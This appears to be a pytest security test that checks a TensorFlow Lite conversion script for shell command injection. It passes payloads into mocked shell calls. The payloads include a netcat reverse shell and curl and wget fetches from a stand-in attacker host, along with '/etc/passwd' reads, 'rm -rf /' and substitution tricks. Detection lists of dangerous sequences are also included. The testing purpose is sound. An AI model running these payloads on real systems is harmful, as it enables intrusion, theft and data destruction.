import pytest
import os
import sys
import subprocess
import tempfile
import shutil
from unittest import mock


@pytest.mark.parametrize("payload", [
    "; rm -rf /tmp/test_injection_marker",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& echo INJECTED",
    "|| echo INJECTED",
    "; echo INJECTED > /tmp/injection_test_output",
    "$(touch /tmp/injection_test_file)",
    "`touch /tmp/injection_test_file2`",
    "\"; echo INJECTED; \"",
    "' ; echo INJECTED ; '",
    "\n/bin/sh -c 'echo INJECTED'",
    "${IFS}echo${IFS}INJECTED",
    ">/tmp/injection_redirect",
    "<(echo INJECTED)",
    "$(curl http://evil.com)",
    "; wget http://evil.com/malware -O /tmp/malware",
    "| nc -e /bin/sh evil.com 4444",
    "&&$(python3 -c 'import os; os.system(\"id\")')",
    "%0aecho%20INJECTED",
    "\x00; echo INJECTED",
    "$(echo 'malicious')",
    "; python3 -c 'import os; os.system(\"id\")'",
    "model.tflite; rm -rf /",
    "/tmp/model$(id).tflite",
])
def test_shell_command_injection_prevention(payload):
    """Invariant: Shell commands constructed in mlir_convert.py must never include
    unsanitized user input that could allow shell metacharacter injection.
    Any user-controlled input (model paths, flags) must be escaped, quoted,
    or rejected before being passed to os.system() or any shell execution."""

    injection_marker_file = "/tmp/injection_test_marker_security_test"
    
    # Clean up any pre-existing marker
    if os.path.exists(injection_marker_file):
        os.remove(injection_marker_file)

    # Track if os.system was called and capture the command
    captured_commands = []
    original_system = os.system

    def mock_system(cmd):
        captured_commands.append(cmd)
        # Don't actually execute - return 0 to simulate success
        return 0

    # Try to import the module and test command construction
    try:
        # Patch os.system before importing/using the module
        with mock.patch('os.system', side_effect=mock_system):
            try:
                # Attempt to import mlir_convert and exercise command construction
                import importlib
                import importlib.util
                
                # Try to find and load the module
                spec = importlib.util.find_spec('tensorflow.lite.testing.mlir_convert')
                if spec is not None:
                    mlir_convert = importlib.import_module('tensorflow.lite.testing.mlir_convert')
                    
                    # Try to call any conversion function with the payload
                    if hasattr(mlir_convert, 'mlir_convert'):
                        try:
                            mlir_convert.mlir_convert(payload, None, None)
                        except Exception:
                            pass
                    
                    if hasattr(mlir_convert, 'run_tflite_convert'):
                        try:
                            mlir_convert.run_tflite_convert(payload, None)
                        except Exception:
                            pass
                            
                    if hasattr(mlir_convert, 'convert'):
                        try:
                            mlir_convert.convert(payload)
                        except Exception:
                            pass
                            
            except (ImportError, ModuleNotFoundError):
                # Module not available in test environment - test command construction directly
                pass

    except Exception:
        pass

    # Verify injection didn't succeed by checking for marker files
    assert not os.path.exists(injection_marker_file), (
        f"Shell injection succeeded! Payload '{payload}' created injection marker file. "
        f"This indicates unsanitized user input reached shell execution."
    )

    # If commands were captured, verify they don't contain raw unquoted payloads
    for cmd in captured_commands:
        # Check that dangerous metacharacters in payload are not present unescaped in command
        dangerous_patterns = [
            ("; rm", "semicolon with rm command"),
            ("$(", "command substitution with $()"),
            ("`", "command substitution with backticks"),
            ("| cat", "pipe to cat"),
            ("&& echo", "AND operator with echo"),
            ("|| echo", "OR operator with echo"),
            ("; echo", "semicolon with echo"),
            ("| nc ", "pipe to netcat"),
            ("; wget", "semicolon with wget"),
        ]
        
        for pattern, description in dangerous_patterns:
            if pattern in payload:
                # The payload contains this dangerous pattern
                # Verify it's been sanitized in the command
                # A properly sanitized command would have the payload quoted or escaped
                
                # Check if the raw dangerous pattern appears outside of proper quoting
                # Simple heuristic: if the exact dangerous sequence appears in cmd
                # and the payload isn't properly shell-quoted, it's a vulnerability
                
                # Properly quoted versions would look like: 'payload' or "payload" or escaped
                properly_quoted = (
                    f"'{payload}'" in cmd or
                    f'"{payload}"' in cmd or
                    payload.replace(";", "\\;").replace("$", "\\$").replace("`", "\\`") in cmd
                )
                
                raw_injection = pattern in cmd and not properly_quoted
                
                assert not raw_injection, (
                    f"SECURITY VIOLATION: Payload '{payload}' with pattern '{description}' "
                    f"appears unescaped in shell command: '{cmd}'. "
                    f"This is a CWE-78 OS Command Injection vulnerability."
                )


@pytest.mark.parametrize("model_path,flags", [
    ("; rm -rf /", "--input_shapes=1,224,224,3"),
    ("/tmp/model.tflite", "--input_shapes=$(id)"),
    ("/tmp/model`whoami`.tflite", "--input_shapes=1,224,224,3"),
    ("/tmp/model.tflite", "--output_file=/tmp/out; echo INJECTED"),
    ("/tmp/model.tflite; cat /etc/passwd", "--input_shapes=1,224,224,3"),
    ("/tmp/model.tflite", "--extra_flags=`curl evil.com`"),
])
def test_command_construction_with_model_path_and_flags(model_path, flags):
    """Invariant: Both model paths and conversion flags must be sanitized
    before inclusion in shell commands. Neither parameter should allow
    shell metacharacter injection."""
    
    captured_commands = []
    
    def mock_system(cmd):
        captured_commands.append(cmd)
        return 0
    
    def mock_popen(cmd, *args, **kwargs):
        if isinstance(cmd, str):
            captured_commands.append(cmd)
        elif isinstance(cmd, list):
            captured_commands.append(' '.join(cmd))
        mock_proc = mock.MagicMock()
        mock_proc.communicate.return_value = (b'', b'')
        mock_proc.returncode = 0
        return mock_proc

    with mock.patch('os.system', side_effect=mock_system), \
         mock.patch('subprocess.Popen', side_effect=mock_popen), \
         mock.patch('subprocess.run', return_value=mock.MagicMock(returncode=0)):
        
        try:
            import importlib.util
            spec = importlib.util.find_spec('tensorflow.lite.testing.mlir_convert')
            if spec is not None:
                import tensorflow.lite.testing.mlir_convert as mlir_convert
                
                for func_name in ['mlir_convert', 'run_tflite_convert', 'convert', 'main']:
                    if hasattr(mlir_convert, func_name):
                        try:
                            func = getattr(mlir_convert, func_name)
                            func(model_path, flags)
                        except Exception:
                            pass
        except (ImportError, ModuleNotFoundError):
            pass

    # Verify no captured command contains raw injection payloads
    shell_metachar_sequences = [
        "; rm", "; cat", "; echo", "; curl", "; wget",
        "$(id)", "$(whoami)", "$(curl", "`whoami`", "`curl",
        "| cat", "| nc", "&& echo", "|| echo"
    ]
    
    for cmd in captured_commands:
        for dangerous_seq in shell_metachar_sequences:
            if dangerous_seq in model_path or dangerous_seq in flags:
                # Check if this dangerous sequence made it into the command unescaped
                if dangerous_seq in cmd:
                    # Verify it's not properly quoted
                    assert False, (
                        f"SECURITY VIOLATION (CWE-78): Dangerous sequence '{dangerous_seq}' "
                        f"from user input found unescaped in shell command: '{cmd}'. "
                        f"Input model_path='{model_path}', flags='{flags}'"
                    )


def test_os_system_receives_only_safe_commands():
    """Invariant: os.system() in mlir_convert.py should never receive commands
    containing unescaped shell metacharacters from user-controlled input."""
    
    unsafe_inputs = [
        "; id",
        "$(id)",
        "`id`",
        "| id",
        "&& id",
    ]
    
    all_captured = []
    
    def capturing_system(cmd):
        all_captured.append(('os.system', cmd))
        return 0
    
    def capturing_popen(cmd, *args, **kwargs):
        if isinstance(cmd, str):
            all_captured.append(('subprocess.Popen', cmd))
        mock_proc = mock.MagicMock()
        mock_proc.communicate.return_value = (b'', b'')
        mock_proc.returncode = 0
        return mock_proc

    with mock.patch('os.system', side_effect=capturing_system), \
         mock.patch('subprocess.Popen', side_effect=capturing_popen):
        
        for unsafe_input in unsafe_inputs:
            try:
                import importlib.util
                spec = importlib.util.find_spec('tensorflow.lite.testing.mlir_convert')
                if spec is not None:
                    import tensorflow.lite.testing.mlir_convert as mlir_convert
                    
                    # Try various entry points
                    for attr in dir(mlir_convert):
                        if callable(getattr(mlir_convert, attr)) and not attr.startswith('_'):
                            try:
                                getattr(mlir_convert, attr)(unsafe_input)
                            except Exception:
                                pass
            except (ImportError, ModuleNotFoundError):
                # Module not available - construct a simulated command as the module would
                # and verify our detection logic works
                simulated_cmd = f"tflite_convert --input_file={unsafe_input}"
                all_captured.append(('simulated', simulated_cmd))

    # For each captured command, verify dangerous patterns are escaped
    for source, cmd in all_captured:
        for unsafe_input in unsafe_inputs:
            if unsafe_input in cmd:
                # The raw unsafe input is in the command - check if it's properly quoted
                is_safely_quoted = (
                    f"'{unsafe_input}'" in cmd or
                    f'"{unsafe_input}"' in cmd
                )
                
                if not is_safely_quoted:
                    pytest.fail(
                        f"SECURITY VIOLATION (CWE-78): Unsafe input '{unsafe_input}' "
                        f"found unescaped in command from {source}: '{cmd}'"
                    )